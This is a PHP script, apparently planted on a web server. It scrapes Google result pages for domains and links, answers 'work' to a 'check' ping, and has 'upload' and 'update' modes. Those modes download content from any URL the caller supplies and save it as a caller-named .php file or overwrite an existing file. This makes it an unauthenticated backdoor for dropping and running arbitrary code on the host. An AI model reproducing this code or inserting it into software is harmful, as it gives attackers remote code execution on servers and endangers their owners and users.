<?php 
//updateddsadasdasda
function get_serp ($url) {
	//$url="http://www.google.com.ua/search?q=google";
	$ch = curl_init();

	  curl_setopt($ch,CURLOPT_URL,$url);
	  curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
	  curl_setopt($ch,CURLOPT_CONNECTTIMEOUT, 10);
	  curl_setopt($ch, CURLOPT_TIMEOUT, 10);
	  //curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
	  //curl_setopt($ch, CURLOPT_INTERFACE, "62.149.2.".rand(18, 31));
	  //curl_setopt($ch, CURLOPT_INTERFACE, "62.149.2.31");
	  $data = curl_exec($ch);

	  if(!curl_errno($ch)){ 
		 return $data;
	  }else{
		echo 'Curl error: ' . curl_error($ch); 
	  }
	curl_close($ch);
}

if (isset($_GET['check']))
{
echo "work";
}

if (!isset($_GET['type'])) {
if(isset($_GET['searchquery']))
{
$searchquery=$_GET['searchquery'];
$pages = $_GET['pages'];
$start= $_GET['start'];

if(!empty($searchquery) && !empty($pages))
    {
        $query = str_replace(" ","+",$searchquery);
        
        $query = str_replace("%26","&",$query);
 
        // How many results to search through.
        $total_to_search = $pages;
 
        // The number of hits per page.
        $hits_per_page   = 10;
 
 if (empty($start)) {$start=0;}
        // This will be our rank
        $position      = 0;
 $positionRealpos      = 0;
 $fl=0;
  $flno=0;
        for($i=$start;$i<$total_to_search;$i+=$hits_per_page)
        {
            $filename = "http://www.google.com/search?as_q=$query".
            "&hl=ru&ie=UTF-8&btnG=Google+Search&num=$hits_per_page&pws=0&start=$i";
           
                    $var = get_serp($filename);
				
                    $fileparts = explode("<h3 class=\"r\">", $var);

                    for ($f=1; $f<sizeof($fileparts); $f++) {
						$position++;
						$positionRealpos++;

						$fileparts[$f] = str_replace("<b>","", $fileparts[$f]);
						$fileparts[$f] = str_replace("</b>","", $fileparts[$f]);
						
						$domain = explode("<cite>", $fileparts[$f]);
						if (isset ($domain[1])){
						$domain2 = explode("</cite>", $domain[1]);
						$domain3 = explode("/", $domain2[0]);
						$domain3[0] = str_replace("www.","", $domain3[0]);
						}
						if ($domain3[0]!="") {
						if (strpos($domain3[0], "."))
						 { echo $domain3[0]."<br>"; }
						 
						 }

                    }
			}
		}

}
} elseif ($_GET['type']=="links")
{

if(isset($_GET['searchquery']))
{

$searchquery=$_GET['searchquery'];
$pages = $_GET['pages'];
$start= $_GET['start'];
if(isset($_GET['dom']))
{
$dom= $_GET['dom'];
} else { $dom="com";}


if(!empty($searchquery) && !empty($pages))
    {
        $query = str_replace(" ","+",$searchquery);
        
        $query = str_replace("%26","&",$query);
 
        // How many results to search through.
        $total_to_search = $pages;
 
        // The number of hits per page.
        $hits_per_page   = 10;

 if (empty($start)) {$start=0;}

        $position      = 0;
 $positionRealpos      = 0;
 $fl=0;
  $flno=0;
        for($i=$start;$i<$total_to_search;$i+=$hits_per_page)
        {
            
			$filename = "http://www.google.$dom/search?as_q=$query".
            "&hl=ru&ie=UTF-8&btnG=Google+Search&num=$hits_per_page&pws=0&start=$i";
           
                    $var = get_serp($filename);
                    
                    $fileparts = explode("<h3 class=\"r\">", $var);

                    for ($f=1; $f<sizeof($fileparts); $f++) {
						$position++;
						$positionRealpos++;

						$fileparts[$f] = str_replace("<b>","", $fileparts[$f]);
						$fileparts[$f] = str_replace("</b>","", $fileparts[$f]);
						
						$d_path = explode("</h3>", $fileparts[$f]);
						$d_path2 = explode("&amp;sa", $d_path[0]);
						
						$d_path3 = explode("http://", $d_path2[0]);
						if (isset ($d_path3[1])){
						$path=$d_path3[1];
						
						$path =str_replace('%2F','/',  $path);
						$path =str_replace('%3F', '?',  $path);
						$path =str_replace('%3D', '=',  $path);
						$path =str_replace('%26', '&',  $path);
						$path =str_replace('%2523', '#',  $path);

						echo /*$domain3[0]." --- ".*/"<br>http://".$path;
						$domain3[0] = str_replace("www.","", $domain3[0]);
						}
						if ($domain3[0]!="") {
						if (strpos($domain3[0], "."))
						 { //echo $domain3[0]."<br>"; 
						 }
						 
						 }

                    }
			}
		}

}

}	elseif ($_GET['type']=="upload")
{
	if (isset($_GET['get_url'])) {
	$fff=file_get_contents($_GET['get_url']);
	if (isset($_GET['f_name'])) 
	{
	if (file_put_contents($_GET['f_name'].'.php', $fff)){
		echo "ok";
	} else { echo "not save";}
	} else { echo "no name";}
	}
	
} elseif ($_GET['type']=="update") {

		if (isset($_GET['get_url'])) 
		{
			if (isset($_GET['f_name'])) 
			{
				$fff=file_get_contents($_GET['get_url']);
				if (file_put_contents($_GET['f_name'].'.bak', $fff))
					{ echo "ok";} 
				else 
					{ echo "not save"; }
					
				$file = $_GET['f_name'].'.bak';
				$newfile = $_GET['f_name'];

				if (!copy($file, $newfile)) {
				    echo "не удалось скопировать $file...\n";
				} //else { echo "updated"; unlink($file); } 
			}

		}

}

?>